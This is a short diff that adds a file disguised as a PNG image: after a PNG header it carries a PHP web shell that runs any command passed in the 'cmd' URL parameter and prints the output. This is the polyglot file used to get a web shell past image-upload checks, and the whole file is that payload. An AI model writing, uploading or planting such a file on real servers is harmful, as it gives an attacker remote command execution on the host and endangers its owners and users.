@@ -1,0 +1,8 @@
+‰PNG
+
+âŠâšâŠ
+<?php
+	$output = shell_exec($_GET["cmd"]);
+	echo "<pre>$output</pre>";
+
+?>
